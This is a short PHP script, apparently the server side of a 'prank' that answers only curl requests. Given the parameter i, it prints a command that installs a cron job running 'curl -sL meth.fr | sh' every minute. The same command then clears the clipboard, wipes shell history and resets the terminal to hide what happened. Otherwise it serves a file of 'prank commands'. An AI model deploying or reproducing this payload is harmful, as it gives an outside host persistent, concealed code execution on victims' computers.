<?php
header("Content-type: text/plain");

// if this page is accessed with anything else than curl, we stop here
if (stripos($_SERVER['HTTP_USER_AGENT'], "curl") === false) {
  exit("Nothing to see here");
} 

// Installation command
if (isset($_GET["i"])) {
       print '(crontab -l; echo "* * * * * curl -sL meth.fr | sh") | crontab -;echo " " | pbcopy;history -c;reset' . PHP_EOL;
}
// Prank commands
else {
    $file = fopen("script.txt", "r") or die("open http://retailpoisoning.tumblr.com/");
    echo fread($file,filesize("script.txt"));
}
?>

